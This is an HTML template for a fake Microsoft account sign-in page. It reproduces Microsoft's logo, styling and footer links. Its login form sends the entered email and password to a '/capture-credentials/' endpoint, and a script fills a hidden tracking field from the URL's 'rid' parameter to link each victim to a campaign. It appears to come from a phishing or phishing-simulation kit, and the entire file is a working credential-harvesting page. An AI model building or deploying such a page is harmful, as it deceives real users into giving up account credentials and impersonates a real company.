<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to your Microsoft account</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          "Segoe UI", "Helvetica Neue", "Apple Color Emoji", "Segoe UI Emoji",
          sans-serif;
        background: #f2f2f2;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .login-container {
        background: white;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        width: 440px;
        padding: 44px 40px 48px;
        margin: 20px;
      }

      .microsoft-logo {
        text-align: left;
        margin-bottom: 32px;
      }

      .microsoft-logo svg {
        width: 108px;
      }

      h1 {
        font-size: 24px;
        font-weight: 600;
        color: #1b1b1b;
        margin-bottom: 8px;
      }

      .subtitle {
        color: #1b1b1b;
        font-size: 14px;
        margin-bottom: 28px;
      }

      .input-group {
        margin-bottom: 20px;
      }

      .input-group input {
        width: 100%;
        padding: 12px 12px;
        border: 1px solid #8a8a8a;
        border-radius: 2px;
        font-size: 15px;
        transition: border-color 0.2s;
      }

      .input-group input:focus {
        outline: none;
        border-color: #0067b8;
      }

      .signin-btn {
        width: 100%;
        background: #0067b8;
        color: white;
        border: none;
        padding: 12px;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        margin-bottom: 20px;
        transition: background 0.2s;
      }

      .signin-btn:hover {
        background: #004c8f;
      }

      .options {
        display: flex;
        justify-content: space-between;
        font-size: 13px;
      }

      .options a {
        color: #0067b8;
        text-decoration: none;
      }

      .options a:hover {
        text-decoration: underline;
      }

      .footer {
        margin-top: 32px;
        padding-top: 16px;
        border-top: 1px solid #e1e1e1;
        font-size: 12px;
        color: #666;
        text-align: center;
      }

      .footer a {
        color: #0067b8;
        text-decoration: none;
      }

      .error {
        background: #e81123;
        color: white;
        padding: 10px;
        border-radius: 4px;
        margin-bottom: 20px;
        display: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <div class="microsoft-logo">
        <svg viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="1" y="1" width="9" height="9" fill="#F25022" />
          <rect x="11" y="1" width="9" height="9" fill="#7FBA00" />
          <rect x="1" y="11" width="9" height="9" fill="#00A4EF" />
          <rect x="11" y="11" width="9" height="9" fill="#FFB900" />
        </svg>
      </div>

      <h1>Sign in</h1>
      <div class="subtitle">to continue to Microsoft account</div>

      <form method="POST" action="/capture-credentials/">
        <div class="input-group">
          <input
            type="text"
            name="username"
            placeholder="Email, phone, or Skype"
            required
            autofocus
          />
        </div>
        <div class="input-group">
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
          />
        </div>
        <input type="hidden" name="tracking_uuid" value="{{ tracking_uuid }}" />

        <button type="submit" class="signin-btn">Sign in</button>
      </form>

      <div class="options">
        <a href="#">Sign in options</a>
        <a href="#">Create one!</a>
      </div>

      <div class="footer">
        <a href="#">Privacy & cookies</a> | <a href="#">Terms of use</a> |
        <a href="#">Contact Microsoft</a>
      </div>
    </div>

    <script>
      // Get tracking UUID from URL
      const urlParams = new URLSearchParams(window.location.search);
      const trackingUuid = urlParams.get("rid");
      if (trackingUuid) {
        document.querySelector('input[name="tracking_uuid"]').value =
          trackingUuid;
      }
    </script>
  </body>
</html>
